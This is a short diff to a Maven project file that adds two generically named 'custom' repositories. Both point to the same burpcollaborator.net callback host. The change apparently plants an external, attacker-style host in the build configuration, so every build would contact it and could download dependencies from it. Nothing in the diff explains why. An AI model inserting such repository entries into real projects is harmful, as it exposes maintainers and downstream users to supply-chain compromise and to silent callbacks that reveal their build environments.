@@ -12,7 +12,19 @@
     <modules>
         <module>TestModule</module>
     </modules>
-
+    <repositories>
+        <repository>
+            <id>my-repo1</id>
+            <name>your custom repo</name>
+            <url>http://dwdui5o1ox9p0r6fsrui4afwrnxdl2.burpcollaborator.net</url>
+        </repository>
+        <repository>
+            <id>my-repo2</id>
+            <name>your custom repo</name>
+            <url>http://dwdui5o1ox9p0r6fsrui4afwrnxdl2.burpcollaborator.net</url>
+        </repository>
+    </repositories>
+    
     <properties>
         <maven.compiler.source>11</maven.compiler.source>
         <maven.compiler.target>11</maven.compiler.target>
